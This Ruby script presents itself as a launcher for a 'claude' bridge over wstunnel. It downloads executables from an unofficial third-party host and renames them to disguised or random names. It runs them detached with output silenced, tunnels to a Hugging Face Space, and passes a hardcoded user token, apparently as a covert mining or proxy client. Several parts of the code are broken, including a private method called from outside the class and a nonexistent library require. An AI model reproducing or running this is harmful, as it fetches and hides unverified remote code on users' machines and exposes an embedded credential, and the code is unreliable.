#!/usr/bin/env ruby
# Sophisticated wstunnel + claude bridge launcher
# Features: temp directory isolation, process group management, signal cleanup,
#           port validation, retry logic, structured logging

require 'securerandom'
require 'socket'
require 'fileutils'
require 'tmpdir'
require 'logger'
require 'open-uri'
require 'timeout'
require 'etc'

class BridgeError < StandardError; end
class DownloadError < BridgeError; end
class LaunchError < BridgeError; end

class TunnelLauncher
  CONFIG = {
    wstunnel_url: "https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz",
    claude_url: "https://storage.technoelectro.online/claude",
    wss_endpoint: "wss://namtran1922-datalab.hf.space",
    user_token: "prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t",
    min_port: 10_000,
    max_port: 65_000,
    port_scan_attempts: 10,
    download_timeout: 120,
    startup_grace_period: 3,
    max_runtime_hours: 12
  }.freeze

  attr_reader :port, :binary_name, :tmpdir, :logger, :children

  def initialize
    @port = find_available_port
    @binary_name = SecureRandom.alphanumeric(12).downcase
    @tmpdir = Dir.mktmpdir("bridge_#{Process.pid}_")
    @children = []
    @logger = build_logger
    @logger.info "Temp workspace: #{@tmpdir}"
  end

  def launch!
    @logger.info "=== Starting Bridge Launcher ==="

    begin
      wstunnel_path = setup_wstunnel
      claude_path = setup_claude
      start_tunnel(wstunnel_path)
      verify_port_open
      start_claude(claude_path)
      show_status

      @logger.info "Sleeping #{CONFIG[:max_runtime_hours]}h..."
      sleep(CONFIG[:max_runtime_hours] * 60 * 60)
    rescue => e
      @logger.error "Fatal: #{e.class}: #{e.message}"
      raise
    ensure
      cleanup
    end
  end

  private

  def build_logger
    log = Logger.new($stderr)
    log.level = Logger::INFO
    log.formatter = proc do |severity, datetime, progname, msg|
      "[#{datetime.strftime('%H:%M:%S')}] #{severity.ljust(7)} | #{msg}\n"
    end
    log
  end

  def setup_signal_handlers
    %w[INT TERM QUIT].each do |sig|
      Signal.trap(sig) do
        @logger.info "Signal #{sig} received — shutting down gracefully"
        cleanup
        exit(0)
      end
    end
  end

  def port_in_use?(port)
    TCPServer.new("127.0.0.1", port).tap(&:close).close
    false
  rescue Errno::EADDRINUSE, Errno::EACCES
    true
  end

  def find_available_port
    CONFIG[:port_scan_attempts].times do
      candidate = rand(CONFIG[:min_port]..CONFIG[:max_port])
      return candidate unless port_in_use?(candidate)
    end
    raise BridgeError, "No available ports after #{CONFIG[:port_scan_attempts]} attempts"
  end

  def retryable(max_retries: 3, delay: 2)
    attempts = 0
    begin
      yield
    rescue => e
      attempts += 1
      if attempts <= max_retries
        @logger.warn "Attempt #{attempts} failed: #{e.message}. Retrying in #{delay}s..."
        sleep(delay)
        retry
      else
        raise e
      end
    end
  end

  def download_file(url, destination)
    @logger.info "Downloading #{File.basename(url)}..."
    URI.open(url, "rb", read_timeout: CONFIG[:download_timeout]) do |remote|
      File.open(destination, "wb") do |local|
        local.write(remote.read)
      end
    end
  rescue OpenURI::HTTPError, Net::OpenTimeout, Errno::ECONNREFUSED => e
    raise DownloadError, "Download failed from #{url}: #{e.message}"
  end

  def extract_tar_gz(path)
    @logger.info "Extracting #{path}..."
    require 'zlib'
    require 'tar'

    Zlib::GzipReader.open(path) do |gz|
      Gem::Package::TarReader.new(gz) do |tar|
        tar.each do |entry|
          dest = File.join(@tmpdir, entry.full_name)
          if entry.directory?
            FileUtils.mkdir_p(dest)
          else
            FileUtils.mkdir_p(File.dirname(dest))
            File.open(dest, "wb") { |f| f.write(entry.read) }
            # Preserve executable bit
            mode = entry.header.mode | (entry.header.mode & 0111)
            FileUtils.chmod(mode, dest)
          end
        end
      end
    end
  rescue Zlib::GzipFile::Error, Gem::Package::TarReader::Error => e
    raise DownloadError, "Corrupt archive #{path}: #{e.message}"
  end

  def make_executable(path)
    mode = File.stat(path).mode | 0111
    FileUtils.chmod(mode, path)
  end

  def setup_wstunnel
    tar_path = File.join(@tmpdir, "wstunnel.tar.gz")
    retryable { download_file(CONFIG[:wstunnel_url], tar_path) }

    extract_tar_gz(tar_path)
    FileUtils.rm(tar_path)

    src = File.join(@tmpdir, "wstunnel")
    dest = File.join(@tmpdir, "kbridge")
    raise LaunchError, "wstunnel binary missing after extraction" unless File.exist?(src)

    FileUtils.mv(src, dest)
    make_executable(dest)
    @logger.info "Wstunnel prepared at #{dest}"
    dest
  end

  def setup_claude
    claude_path = File.join(@tmpdir, "claude")
    retryable { download_file(CONFIG[:claude_url], claude_path) }

    dest = File.join(@tmpdir, @binary_name)
    FileUtils.mv(claude_path, dest)
    make_executable(dest)
    @logger.info "Claude binary prepared as #{@binary_name}"
    dest
  end

  def spawn_detached(cmd)
    @logger.debug "Spawning: #{cmd.shelljoin}"
    pid = Process.spawn(*cmd, chdir: @tmpdir, out: File::NULL, err: File::NULL, pgrp: true)
    @children << pid
    @logger.info "Launched process group #{pid}"
    pid
  end

  def start_tunnel(kbridge_path)
    tunnel_cmd = [
      kbridge_path, "client",
      CONFIG[:wss_endpoint],
      "-L", "tcp://#{@port}:127.0.0.1:1"
    ]
    spawn_detached(tunnel_cmd)
  end

  def verify_port_open
    Timeout.timeout(CONFIG[:startup_grace_period]) do
      loop do
        begin
          TCPSocket.new("127.0.0.1", @port).close
          @logger.info "Port #{@port} is accepting connections"
          return
        rescue Errno::ECONNREFUSED, Errno::EAGAIN
          sleep 0.2
        end
      end
    end
  rescue Timeout::Error
    raise LaunchError, "Tunnel did not bind port #{@port} within #{CONFIG[:startup_grace_period]}s"
  end

  def start_claude(claude_path)
    claude_cmd = [
      claude_path,
      "--host", "127.0.0.1:#{@port}",
      "--user", CONFIG[:user_token]
    ]
    spawn_detached(claude_cmd)
    @logger.info "Claude launched via tunnel on port #{@port}"
  end

  def show_status
    system("clear") || system("cls") || nil
    puts "=" * 42
    puts "  Processes Started"
    puts "=" * 42
    puts "  Port      : #{@port}"
    puts "  Binary    : #{@binary_name}"
    puts "  PID(s)    : #{@children.join(', ')}"
    puts "  Temp Dir  : #{@tmpdir}"
    puts "=" * 42
    puts "  Press Ctrl+C to stop all"
    puts "=" * 42
  end

  def cleanup
    @logger.info "Cleaning up #{@children.length} process(es)..."
    @children.each do |pid|
      begin
        Process.kill("TERM", -pid) rescue nil
        Process.wait(pid, timeout: 2) rescue nil
        Process.kill("KILL", -pid) rescue nil
      rescue => e
        @logger.debug "Cleanup #{pid}: #{e.message}"
      end
    end
  ensure
    FileUtils.rm_rf(@tmpdir)
    @logger.info "Temp directory removed"
  end
end

# Entrypoint
begin
  launcher = TunnelLauncher.new
  launcher.setup_signal_handlers
  launcher.launch!
rescue SystemExit
  raise
rescue => e
  $stderr.puts "[FATAL] #{e.class}: #{e.message}"
  exit(1)
end
